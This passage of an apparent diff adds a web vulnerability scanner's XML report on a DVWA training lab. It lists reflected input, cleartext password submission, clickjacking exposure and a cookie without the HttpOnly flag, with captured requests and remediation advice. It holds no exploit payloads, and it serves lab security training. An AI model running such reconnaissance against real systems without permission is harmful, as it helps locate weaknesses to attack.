+Accept-Language: en-US,en-GB;q=0.9,en;q=0.8
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36
+Connection: close
+Cache-Control: max-age=0
+Referer: http://6dwib62km8jeau3p8lpj07pks.us-east1.attackdefenselabs.com/
+Cookie: PHPSESSID=oa4eb5dg1bt6as9e17ntmscm33; security=impossible
+
+]]></request>
+      <response base64="false"><![CDATA[HTTP/1.1 200 OK
+Cache-Control: no-cache, must-revalidate
+Content-Length: 1523
+Content-Type: text/html;charset=utf-8
+Date: Sun, 15 Sep 2019 22:20:56 GMT
+Expires: Tue, 23 Jun 2009 12:00:00 GMT
+Pragma: no-cache
+Server: Apache/2.4.7 (Ubuntu)
+Vary: Accept-Encoding
+X-Powered-By: PHP/5.5.9-1ubuntu4.25
+Connection: close
+
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+
+	<head>
+
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+
+		<title>Login :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*</title>
+
+		<link rel="stylesheet" type="text/css" href="dvwa/css/login.css" />
+
+	</head>
+
+	<body>
+
+	<div id="wrapper">
+
+	<div id="header">
+
+	<br />
+
+	<p><img src="dvwa/images/login_logo.png" /></p>
+
+	<br />
+
+	</div> <!--<div id="header">-->
+
+	<div id="content">
+
+	<form action="login.php" method="post">
+
+	<fieldset>
+
+			<label for="user">Username</label> <input type="text" class="loginInput" size="20" name="username"><br />
+
+
+			<label for="pass">Password</label> <input type="password" class="loginInput" AUTOCOMPLETE="off" size="20" name="password"><br />
+
+			<br />
+
+			<p class="submit"><input type="submit" value="Login" name="Login"></p>
+
+	</fieldset>
+
+	<input type='hidden' name='user_token' value='682c98739f55af3ac09dff549d5d236e' />
+
+	</form>
+
+	<br />
+
+	
+
+	<br />
+	<br />
+	<br />
+	<br />
+	<br />
+	<br />
+	<br />
+	<br />
+
+	<!-- <img src="dvwa/images/RandomStorm.png" /> -->
+	</div > <!--<div id="content">-->
+
+	<div id="footer">
+
+	<p><a href="http://www.dvwa.co.uk/" target="_blank">Damn Vulnerable Web Application (DVWA)</a></p>
+
+	</div> <!--<div id="footer"> -->
+
+	</div> <!--<div id="wrapper"> -->
+
+	</body>
+
+</html>]]></response>
+      <responseRedirected>false</responseRedirected>
+    </requestresponse>
+  </issue>
+  <issue>
+    <serialNumber>6648229887896033280</serialNumber>
+    <type>4197376</type>
+    <name><![CDATA[Input returned in response (reflected)]]></name>
+    <host ip="45.33.74.114">http://6dwib62km8jeau3p8lpj07pks.us-east1.attackdefenselabs.com</host>
+    <path><![CDATA[/login.php]]></path>
+    <location><![CDATA[/login.php [URL path filename]]]></location>
+    <severity>Information</severity>
+    <confidence>Certain</confidence>
+    <issueBackground><![CDATA[<p>Reflection of input arises when data is copied from a request and echoed into the application's immediate response.</p><p>Input being returned in application responses is not a vulnerability in its own right. However, it is a prerequisite for many client-side vulnerabilities, including cross-site scripting, open redirection, content spoofing, and response header injection. Additionally, some server-side vulnerabilities such as SQL injection are often easier to identify and exploit when input is returned in responses. In applications where input retrieval is rare and the environment is resistant to automated testing (for example, due to a web application firewall), it might be worth subjecting instances of it to focused manual testing. </p>]]></issueBackground>
+    <vulnerabilityClassifications><![CDATA[<ul>
+<li><a href="https://cwe.mitre.org/data/definitions/20.html">CWE-20: Improper Input Validation</a></li>
+<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
+</ul>]]></vulnerabilityClassifications>
+    <issueDetail><![CDATA[The value of the URL path filename is copied into the application's response.]]></issueDetail>
+    <requestresponse>
+      <request method="GET" base64="false"><![CDATA[GET /login.php652e814ets HTTP/1.1
+Host: 6dwib62km8jeau3p8lpj07pks.us-east1.attackdefenselabs.com
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en-US,en-GB;q=0.9,en;q=0.8
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36
+Connection: close
+Cache-Control: max-age=0
+Referer: http://6dwib62km8jeau3p8lpj07pks.us-east1.attackdefenselabs.com/
+Cookie: PHPSESSID=oa4eb5dg1bt6as9e17ntmscm33; security=impossible
+
+]]></request>
+      <response base64="false"><![CDATA[HTTP/1.1 404 Not Found
+Content-Length: 338
+Content-Type: text/html; charset=iso-8859-1
+Date: Sun, 15 Sep 2019 22:20:29 GMT
+Server: Apache/2.4.7 (Ubuntu)
+Connection: close
+
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>404 Not Found</title>
+</head><body>
+<h1>Not Found</h1>
+<p>The requested URL /login.php652e814ets was not found on this server.</p>
+<hr>
+<address>Apache/2.4.7 (Ubuntu) Server at 6dwib62km8jeau3p8lpj07pks.us-east1.attackdefenselabs.com Port 80</address>
+</body></html>
+]]></response>
+      <responseRedirected>false</responseRedirected>
+    </requestresponse>
+  </issue>
+  <issue>
+    <serialNumber>7080277882995143680</serialNumber>
+    <type>4197376</type>
+    <name><![CDATA[Input returned in response (reflected)]]></name>
+    <host ip="45.33.74.114">http://6dwib62km8jeau3p8lpj07pks.us-east1.attackdefenselabs.com</host>
+    <path><![CDATA[/dvwa/css/login.css]]></path>
+    <location><![CDATA[/dvwa/css/login.css [URL path folder 2]]]></location>
+    <severity>Information</severity>
+    <confidence>Certain</confidence>
+    <issueBackground><![CDATA[<p>Reflection of input arises when data is copied from a request and echoed into the application's immediate response.</p><p>Input being returned in application responses is not a vulnerability in its own right. However, it is a prerequisite for many client-side vulnerabilities, including cross-site scripting, open redirection, content spoofing, and response header injection. Additionally, some server-side vulnerabilities such as SQL injection are often easier to identify and exploit when input is returned in responses. In applications where input retrieval is rare and the environment is resistant to automated testing (for example, due to a web application firewall), it might be worth subjecting instances of it to focused manual testing. </p>]]></issueBackground>
+    <vulnerabilityClassifications><![CDATA[<ul>
+<li><a href="https://cwe.mitre.org/data/definitions/20.html">CWE-20: Improper Input Validation</a></li>
+<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
+</ul>]]></vulnerabilityClassifications>
+    <issueDetail><![CDATA[The value of the URL path folder 2 is copied into the application's response.]]></issueDetail>
+    <requestresponse>
+      <request method="GET" base64="false"><![CDATA[GET /dvwa/cssoyhjjotu6d/login.css HTTP/1.1
+Host: 6dwib62km8jeau3p8lpj07pks.us-east1.attackdefenselabs.com
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en-US,en-GB;q=0.9,en;q=0.8
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36
+Connection: close
+Cache-Control: max-age=0
+Referer: http://6dwib62km8jeau3p8lpj07pks.us-east1.attackdefenselabs.com/login.php
+Cookie: PHPSESSID=uep8qhgc479q865ki0hg1q9hf7; security=impossible
+
+]]></request>
+      <response base64="false"><![CDATA[HTTP/1.1 404 Not Found
+Content-Length: 347
+Content-Type: text/html; charset=iso-8859-1
+Date: Sun, 15 Sep 2019 22:20:26 GMT
+Server: Apache/2.4.7 (Ubuntu)
+Connection: close
+
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>404 Not Found</title>
+</head><body>
+<h1>Not Found</h1>
+<p>The requested URL /dvwa/cssoyhjjotu6d/login.css was not found on this server.</p>
+<hr>
+<address>Apache/2.4.7 (Ubuntu) Server at 6dwib62km8jeau3p8lpj07pks.us-east1.attackdefenselabs.com Port 80</address>
+</body></html>
+]]></response>
+      <responseRedirected>false</responseRedirected>
+    </requestresponse>
+  </issue>
+  <issue>
+    <serialNumber>6346877881882500096</serialNumber>
+    <type>4197376</type>
+    <name><![CDATA[Input returned in response (reflected)]]></name>
+    <host ip="45.33.74.114">http://6dwib62km8jeau3p8lpj07pks.us-east1.attackdefenselabs.com</host>
+    <path><![CDATA[/dvwa/css/login.css]]></path>
+    <location><![CDATA[/dvwa/css/login.css [URL path folder 1]]]></location>
+    <severity>Information</severity>
+    <confidence>Certain</confidence>
+    <issueBackground><![CDATA[<p>Reflection of input arises when data is copied from a request and echoed into the application's immediate response.</p><p>Input being returned in application responses is not a vulnerability in its own right. However, it is a prerequisite for many client-side vulnerabilities, including cross-site scripting, open redirection, content spoofing, and response header injection. Additionally, some server-side vulnerabilities such as SQL injection are often easier to identify and exploit when input is returned in responses. In applications where input retrieval is rare and the environment is resistant to automated testing (for example, due to a web application firewall), it might be worth subjecting instances of it to focused manual testing. </p>]]></issueBackground>
+    <vulnerabilityClassifications><![CDATA[<ul>
+<li><a href="https://cwe.mitre.org/data/definitions/20.html">CWE-20: Improper Input Validation</a></li>
+<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
+</ul>]]></vulnerabilityClassifications>
+    <issueDetail><![CDATA[The value of the URL path folder 1 is copied into the application's response.]]></issueDetail>
+    <requestresponse>
+      <request method="GET" base64="false"><![CDATA[GET /dvwat361gjsnux/css/login.css HTTP/1.1
+Host: 6dwib62km8jeau3p8lpj07pks.us-east1.attackdefenselabs.com
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en-US,en-GB;q=0.9,en;q=0.8
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36
+Connection: close
+Cache-Control: max-age=0
+Referer: http://6dwib62km8jeau3p8lpj07pks.us-east1.attackdefenselabs.com/login.php
+Cookie: PHPSESSID=uep8qhgc479q865ki0hg1q9hf7; security=impossible
+
+]]></request>
+      <response base64="false"><![CDATA[HTTP/1.1 404 Not Found
+Content-Length: 347
+Content-Type: text/html; charset=iso-8859-1
+Date: Sun, 15 Sep 2019 22:19:56 GMT
+Server: Apache/2.4.7 (Ubuntu)
+Connection: close
+
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>404 Not Found</title>
+</head><body>
+<h1>Not Found</h1>
+<p>The requested URL /dvwat361gjsnux/css/login.css was not found on this server.</p>
+<hr>
+<address>Apache/2.4.7 (Ubuntu) Server at 6dwib62km8jeau3p8lpj07pks.us-east1.attackdefenselabs.com Port 80</address>
+</body></html>
+]]></response>
+      <responseRedirected>false</responseRedirected>
+    </requestresponse>
+  </issue>
+  <issue>
+    <serialNumber>6484908920037208064</serialNumber>
+    <type>4197376</type>
+    <name><![CDATA[Input returned in response (reflected)]]></name>
+    <host ip="45.33.74.114">http://6dwib62km8jeau3p8lpj07pks.us-east1.attackdefenselabs.com</host>
+    <path><![CDATA[/robots.txt]]></path>
+    <location><![CDATA[/robots.txt [URL path filename]]]></location>
+    <severity>Information</severity>
+    <confidence>Certain</confidence>
+    <issueBackground><![CDATA[<p>Reflection of input arises when data is copied from a request and echoed into the application's immediate response.</p><p>Input being returned in application responses is not a vulnerability in its own right. However, it is a prerequisite for many client-side vulnerabilities, including cross-site scripting, open redirection, content spoofing, and response header injection. Additionally, some server-side vulnerabilities such as SQL injection are often easier to identify and exploit when input is returned in responses. In applications where input retrieval is rare and the environment is resistant to automated testing (for example, due to a web application firewall), it might be worth subjecting instances of it to focused manual testing. </p>]]></issueBackground>
+    <vulnerabilityClassifications><![CDATA[<ul>
+<li><a href="https://cwe.mitre.org/data/definitions/20.html">CWE-20: Improper Input Validation</a></li>
+<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
+</ul>]]></vulnerabilityClassifications>
+    <issueDetail><![CDATA[The value of the URL path filename is copied into the application's response.]]></issueDetail>
+    <requestresponse>
+      <request method="GET" base64="false"><![CDATA[GET /robots.txtyopgqj7ki1 HTTP/1.1
+Host: 6dwib62km8jeau3p8lpj07pks.us-east1.attackdefenselabs.com
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en-US,en-GB;q=0.9,en;q=0.8
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36
+Connection: close
+Cache-Control: max-age=0
+
+]]></request>
+      <response base64="false"><![CDATA[HTTP/1.1 404 Not Found
+Content-Length: 339
+Content-Type: text/html; charset=iso-8859-1
+Date: Sun, 15 Sep 2019 22:19:35 GMT
+Server: Apache/2.4.7 (Ubuntu)
+Connection: close
+
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>404 Not Found</title>
+</head><body>
+<h1>Not Found</h1>
+<p>The requested URL /robots.txtyopgqj7ki1 was not found on this server.</p>
+<hr>
+<address>Apache/2.4.7 (Ubuntu) Server at 6dwib62km8jeau3p8lpj07pks.us-east1.attackdefenselabs.com Port 80</address>
+</body></html>
+]]></response>
+      <responseRedirected>false</responseRedirected>
+    </requestresponse>
+  </issue>
+  <issue>
+    <serialNumber>3913828787214569472</serialNumber>
+    <type>6292992</type>
+    <name><![CDATA[Robots.txt file]]></name>
+    <host ip="45.33.74.114">http://6dwib62km8jeau3p8lpj07pks.us-east1.attackdefenselabs.com</host>
+    <path><![CDATA[/robots.txt]]></path>
+    <location><![CDATA[/robots.txt]]></location>
+    <severity>Information</severity>
+    <confidence>Certain</confidence>
+    <issueBackground><![CDATA[<p>The file robots.txt is used to give instructions to web robots, such as search engine crawlers, about locations within the web site that robots are allowed, or not allowed, to crawl and index.</p>
+<p>The presence of the robots.txt does not in itself present any kind of security vulnerability. However, it is often used to identify restricted or private areas of a site's contents. The information in the file may therefore help an attacker to map out the site's contents, especially if some of the locations identified are not linked from elsewhere in the site. If the application relies on robots.txt to protect access to these areas, and does not enforce proper access control over them, then this presents a serious vulnerability.</p>]]></issueBackground>
+    <remediationBackground><![CDATA[<p>The robots.txt file is not itself a security threat, and its correct use can represent good practice for non-security reasons. You should not assume that all web robots will honor the file's instructions. Rather, assume that attackers will pay close attention to any locations identified in the file. Do not rely on robots.txt to provide any kind of protection over unauthorized access.</p>]]></remediationBackground>
+    <vulnerabilityClassifications><![CDATA[<ul>
+<li><a href="https://cwe.mitre.org/data/definitions/200.html">CWE-200: Information Exposure</a></li>
+</ul>]]></vulnerabilityClassifications>
+    <issueDetail><![CDATA[The web server contains a robots.txt file.]]></issueDetail>
+    <requestresponse>
+      <request method="GET" base64="false"><![CDATA[GET /robots.txt HTTP/1.1
+Host: 6dwib62km8jeau3p8lpj07pks.us-east1.attackdefenselabs.com
+Connection: close
+Cookie: PHPSESSID=jpd63unhelu61ihvajg5nke5a0; security=impossible
+
+]]></request>
+      <response base64="false"><![CDATA[HTTP/1.1 200 OK
+Accept-Ranges: bytes
+Content-Length: 26
+Content-Type: text/plain
+Date: Sun, 15 Sep 2019 22:18:55 GMT
+Etag: "1a-56ff1a44f1180"
+Last-Modified: Sun, 01 Jul 2018 15:21:58 GMT
+Server: Apache/2.4.7 (Ubuntu)
+Connection: close
+
+User-agent: *
+Disallow: /]]></response>
+      <responseRedirected>false</responseRedirected>
+    </requestresponse>
+  </issue>
+  <issue>
+    <serialNumber>38968095616618496</serialNumber>
+    <type>3145984</type>
+    <name><![CDATA[Cleartext submission of password]]></name>
+    <host ip="45.33.74.114">http://6dwib62km8jeau3p8lpj07pks.us-east1.attackdefenselabs.com</host>
+    <path><![CDATA[/login.php]]></path>
+    <location><![CDATA[/login.php]]></location>
+    <severity>High</severity>
+    <confidence>Certain</confidence>
+    <issueBackground><![CDATA[<p>Some applications transmit passwords over unencrypted connections, making them vulnerable to interception. To exploit this vulnerability, an attacker must be suitably positioned to eavesdrop on the victim's network traffic. This scenario typically occurs when a client communicates with the server over an insecure connection such as public Wi-Fi, or a corporate or home network that is shared with a compromised computer. Common defenses such as switched networks are not sufficient to prevent this. An attacker situated in the user's ISP or the application's hosting infrastructure could also perform this attack. Note that an advanced adversary could potentially target any connection made over the Internet's core infrastructure.</p>
+<p>Vulnerabilities that result in the disclosure of users' passwords can result in compromises that are extremely difficult to investigate due to obscured audit trails. Even if the application itself only handles non-sensitive information, exposing passwords puts users who have re-used their password elsewhere at risk.</p>]]></issueBackground>
+    <remediationBackground><![CDATA[<p>Applications should use transport-level encryption (SSL or TLS) to protect all sensitive communications passing between the client and the server. Communications that should be protected include the login mechanism and related functionality, and any functions where sensitive data can be accessed or privileged actions can be performed. These areas should employ their own session handling mechanism, and the session tokens used should never be transmitted over unencrypted communications. If HTTP cookies are used for transmitting session tokens, then the secure flag should be set to prevent transmission over clear-text HTTP.</p>]]></remediationBackground>
+    <vulnerabilityClassifications><![CDATA[<ul>
+<li><a href="https://cwe.mitre.org/data/definitions/319.html">CWE-319: Cleartext Transmission of Sensitive Information</a></li>
+</ul>]]></vulnerabilityClassifications>
+    <issueDetail><![CDATA[The page contains a form with the following action URL, which is submitted over clear-text HTTP:<ul><li>http://6dwib62km8jeau3p8lpj07pks.us-east1.attackdefenselabs.com/login.php</li></ul>The form contains the following password field:<ul><li>password</li></ul>]]></issueDetail>
+    <requestresponse>
+      <request method="GET" base64="false"><![CDATA[GET /login.php HTTP/1.1
+Host: 6dwib62km8jeau3p8lpj07pks.us-east1.attackdefenselabs.com
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en-US,en-GB;q=0.9,en;q=0.8
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36
+Connection: close
+Cache-Control: max-age=0
+Referer: http://6dwib62km8jeau3p8lpj07pks.us-east1.attackdefenselabs.com/
+Cookie: PHPSESSID=dno8mt4b37re9u1g3hvc30i832; security=impossible
+
+]]></request>
+      <response base64="false"><![CDATA[HTTP/1.1 200 OK
+Cache-Control: no-cache, must-revalidate
+Content-Length: 1523
+Content-Type: text/html;charset=utf-8
+Date: Sun, 15 Sep 2019 22:18:43 GMT
+Expires: Tue, 23 Jun 2009 12:00:00 GMT
+Pragma: no-cache
+Server: Apache/2.4.7 (Ubuntu)
+Vary: Accept-Encoding
+X-Powered-By: PHP/5.5.9-1ubuntu4.25
+Connection: close
+
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+
+	<head>
+
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+
+		<title>Login :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*</title>
+
+		<link rel="stylesheet" type="text/css" href="dvwa/css/login.css" />
+
+	</head>
+
+	<body>
+
+	<div id="wrapper">
+
+	<div id="header">
+
+	<br />
+
+	<p><img src="dvwa/images/login_logo.png" /></p>
+
+	<br />
+
+	</div> <!--<div id="header">-->
+
+	<div id="content">
+
+	<form action="login.php" method="post">
+
+	<fieldset>
+
+			<label for="user">Username</label> <input type="text" class="loginInput" size="20" name="username"><br />
+
+
+			<label for="pass">Password</label> <input type="password" class="loginInput" AUTOCOMPLETE="off" size="20" name="password"><br />
+
+			<br />
+
+			<p class="submit"><input type="submit" value="Login" name="Login"></p>
+
+	</fieldset>
+
+	<input type='hidden' name='user_token' value='25bf23dbaf4d89c15a2f7b34178a5be4' />
+
+	</form>
+
+	<br />
+
+	
+
+	<br />
+	<br />
+	<br />
+	<br />
+	<br />
+	<br />
+	<br />
+	<br />
+
+	<!-- <img src="dvwa/images/RandomStorm.png" /> -->
+	</div > <!--<div id="content">-->
+
+	<div id="footer">
+
+	<p><a href="http://www.dvwa.co.uk/" target="_blank">Damn Vulnerable Web Application (DVWA)</a></p>
+
+	</div> <!--<div id="footer"> -->
+
+	</div> <!--<div id="wrapper"> -->
+
+	</body>
+
+</html>]]></response>
+      <responseRedirected>false</responseRedirected>
+    </requestresponse>
+  </issue>
+  <issue>
+    <serialNumber>5443186704253427712</serialNumber>
+    <type>5245344</type>
+    <name><![CDATA[Frameable response (potential Clickjacking)]]></name>
+    <host ip="45.33.74.114">http://6dwib62km8jeau3p8lpj07pks.us-east1.attackdefenselabs.com</host>
+    <path><![CDATA[/login.php]]></path>
+    <location><![CDATA[/login.php]]></location>
+    <severity>Information</severity>
+    <confidence>Firm</confidence>
+    <issueBackground><![CDATA[<p>If a page fails to set an appropriate X-Frame-Options or Content-Security-Policy HTTP header, it might be possible for a page controlled by an attacker to load it within an iframe. This may enable a clickjacking attack, in which the attacker's page overlays the target application's interface with a different interface provided by the attacker. By inducing victim users to perform actions such as mouse clicks and keystrokes, the attacker can cause them to unwittingly carry out actions within the application that is being targeted. This technique allows the attacker to circumvent defenses against cross-site request forgery, and may result in unauthorized actions.</p>
+<p>Note that some applications attempt to prevent these attacks from within the HTML page itself, using "framebusting" code. However, this type of defense is normally ineffective and can usually be circumvented by a skilled attacker.</p>
+<p>You should determine whether any functions accessible within frameable pages can be used by application users to perform any sensitive actions within the application. </p>]]></issueBackground>
+    <remediationBackground><![CDATA[<p>To effectively prevent framing attacks, the application should return a response header with the name <b>X-Frame-Options</b> and the value <b>DENY</b> to prevent framing altogether, or the value <b>SAMEORIGIN</b> to allow framing only by pages on the same origin as the response itself. Note that the SAMEORIGIN header can be partially bypassed if the application itself can be made to frame untrusted websites.</p>]]></remediationBackground>
+    <references><![CDATA[<ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/X-Frame-Options">X-Frame-Options</a></li></ul>]]></references>
+    <vulnerabilityClassifications><![CDATA[<ul>
+<li><a href="https://cwe.mitre.org/data/definitions/693.html">CWE-693: Protection Mechanism Failure</a></li>
+</ul>]]></vulnerabilityClassifications>
+    <requestresponse>
+      <request method="GET" base64="false"><![CDATA[GET /login.php HTTP/1.1
+Host: 6dwib62km8jeau3p8lpj07pks.us-east1.attackdefenselabs.com
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en-US,en-GB;q=0.9,en;q=0.8
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36
+Connection: close
+Cache-Control: max-age=0
+Referer: http://6dwib62km8jeau3p8lpj07pks.us-east1.attackdefenselabs.com/
+Cookie: PHPSESSID=dno8mt4b37re9u1g3hvc30i832; security=impossible
+
+]]></request>
+      <response base64="false"><![CDATA[HTTP/1.1 200 OK
+Cache-Control: no-cache, must-revalidate
+Content-Length: 1523
+Content-Type: text/html;charset=utf-8
+Date: Sun, 15 Sep 2019 22:18:43 GMT
+Expires: Tue, 23 Jun 2009 12:00:00 GMT
+Pragma: no-cache
+Server: Apache/2.4.7 (Ubuntu)
+Vary: Accept-Encoding
+X-Powered-By: PHP/5.5.9-1ubuntu4.25
+Connection: close
+
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+
+	<head>
+
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+
+		<title>Login :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*</title>
+
+		<link rel="stylesheet" type="text/css" href="dvwa/css/login.css" />
+
+	</head>
+
+	<body>
+
+	<div id="wrapper">
+
+	<div id="header">
+
+	<br />
+
+	<p><img src="dvwa/images/login_logo.png" /></p>
+
+	<br />
+
+	</div> <!--<div id="header">-->
+
+	<div id="content">
+
+	<form action="login.php" method="post">
+
+	<fieldset>
+
+			<label for="user">Username</label> <input type="text" class="loginInput" size="20" name="username"><br />
+
+
+			<label for="pass">Password</label> <input type="password" class="loginInput" AUTOCOMPLETE="off" size="20" name="password"><br />
+
+			<br />
+
+			<p class="submit"><input type="submit" value="Login" name="Login"></p>
+
+	</fieldset>
+
+	<input type='hidden' name='user_token' value='25bf23dbaf4d89c15a2f7b34178a5be4' />
+
+	</form>
+
+	<br />
+
+	
+
+	<br />
+	<br />
+	<br />
+	<br />
+	<br />
+	<br />
+	<br />
+	<br />
+
+	<!-- <img src="dvwa/images/RandomStorm.png" /> -->
+	</div > <!--<div id="content">-->
+
+	<div id="footer">
+
+	<p><a href="http://www.dvwa.co.uk/" target="_blank">Damn Vulnerable Web Application (DVWA)</a></p>
+
+	</div> <!--<div id="footer"> -->
+
+	</div> <!--<div id="wrapper"> -->
+
+	</body>
+
+</html>]]></response>
+      <responseRedirected>false</responseRedirected>
+    </requestresponse>
+  </issue>
+  <issue>
+    <serialNumber>1032581499921815552</serialNumber>
+    <type>5244416</type>
+    <name><![CDATA[Cookie without HttpOnly flag set]]></name>
+    <host ip="45.33.74.114">http://6dwib62km8jeau3p8lpj07pks.us-east1.attackdefenselabs.com</host>
+    <path><![CDATA[/]]></path>
+    <location><![CDATA[/]]></location>
+    <severity>Low</severity>
+    <confidence>Firm</confidence>
+    <issueBackground><![CDATA[<p>If the HttpOnly attribute is set on a cookie, then the cookie's value cannot be read or set by client-side JavaScript. This measure makes certain client-side attacks, such as cross-site scripting, slightly harder to exploit by preventing them from trivially capturing the cookie's value via an injected script.</p>]]></issueBackground>
+    <remediationBackground><![CDATA[<p>There is usually no good reason not to set the HttpOnly flag on all cookies. Unless you specifically require legitimate client-side scripts within your application to read or set a cookie's value, you should set the HttpOnly flag by including this attribute within the relevant Set-cookie directive.</p>
+<p>You should be aware that the restrictions imposed by the HttpOnly flag can potentially be circumvented in some circumstances, and that numerous other serious attacks can be delivered by client-side script injection, aside from simple cookie stealing. </p>]]></remediationBackground>
+    <references><![CDATA[<ul>
+<li><a href='https://www.owasp.org/index.php/HttpOnly'>Configuring HttpOnly</a></li>
+</ul>]]></references>
+    <vulnerabilityClassifications><![CDATA[<ul>
+<li><a href="https://cwe.mitre.org/data/definitions/16.html">CWE-16: Configuration</a></li>
+</ul>]]></vulnerabilityClassifications>
+    <issueDetail><![CDATA[The following cookie was issued by the application and does not have the HttpOnly flag set:<ul><li><b>PHPSESSID</b></li></ul>The cookie appears to contain a session token, which may increase the risk associated with this issue. You should review the contents of the cookie to determine its function.]]></issueDetail>
+    <issueDetailItems>
+      <issueDetailItem><![CDATA[Session: PHPSESSID]]></issueDetailItem>
+    </issueDetailItems>
+    <requestresponse>
+      <request method="GET" base64="false"><![CDATA[GET / HTTP/1.1
+Host: 6dwib62km8jeau3p8lpj07pks.us-east1.attackdefenselabs.com
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en-US,en-GB;q=0.9,en;q=0.8
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36
+Connection: close
+Cache-Control: max-age=0
+
+]]></request>
+      <response base64="false"><![CDATA[HTTP/1.1 302 Found
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Content-Length: 0
+Content-Type: text/html
+Date: Sun, 15 Sep 2019 22:18:43 GMT
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Location: login.php
+Pragma: no-cache
+Server: Apache/2.4.7 (Ubuntu)
+Set-Cookie: PHPSESSID=dno8mt4b37re9u1g3hvc30i832; path=/
+Set-Cookie: PHPSESSID=dno8mt4b37re9u1g3hvc30i832; path=/; httponly
+Set-Cookie: security=impossible; httponly
+X-Powered-By: PHP/5.5.9-1ubuntu4.25
+Connection: close
+
+]]></response>
+      <responseRedirected>false</responseRedirected>
+    </requestresponse>
+  </issue>
+  <issue>
+    <serialNumber>7680472425093923840</serialNumber>
+    <type>5245344</type>
+    <name><![CDATA[Frameable response (potential Clickjacking)]]></name>
+    <host ip="45.33.74.114">http://6dwib62km8jeau3p8lpj07pks.us-east1.attackdefenselabs.com</host>
+    <path><![CDATA[/]]></path>
+    <location><![CDATA[/]]></location>
+    <severity>Information</severity>
+    <confidence>Firm</confidence>
+    <issueBackground><![CDATA[<p>If a page fails to set an appropriate X-Frame-Options or Content-Security-Policy HTTP header, it might be possible for a page controlled by an attacker to load it within an iframe. This may enable a clickjacking attack, in which the attacker's page overlays the target application's interface with a different interface provided by the attacker. By inducing victim users to perform actions such as mouse clicks and keystrokes, the attacker can cause them to unwittingly carry out actions within the application that is being targeted. This technique allows the attacker to circumvent defenses against cross-site request forgery, and may result in unauthorized actions.</p>
+<p>Note that some applications attempt to prevent these attacks from within the HTML page itself, using "framebusting" code. However, this type of defense is normally ineffective and can usually be circumvented by a skilled attacker.</p>
+<p>You should determine whether any functions accessible within frameable pages can be used by application users to perform any sensitive actions within the application. </p>]]></issueBackground>
+    <remediationBackground><![CDATA[<p>To effectively prevent framing attacks, the application should return a response header with the name <b>X-Frame-Options</b> and the value <b>DENY</b> to prevent framing altogether, or the value <b>SAMEORIGIN</b> to allow framing only by pages on the same origin as the response itself. Note that the SAMEORIGIN header can be partially bypassed if the application itself can be made to frame untrusted websites.</p>]]></remediationBackground>
+    <references><![CDATA[<ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/X-Frame-Options">X-Frame-Options</a></li></ul>]]></references>
+    <vulnerabilityClassifications><![CDATA[<ul>
+<li><a href="https://cwe.mitre.org/data/definitions/693.html">CWE-693: Protection Mechanism Failure</a></li>
+</ul>]]></vulnerabilityClassifications>
+    <requestresponse>
+      <request method="GET" base64="false"><![CDATA[GET / HTTP/1.1
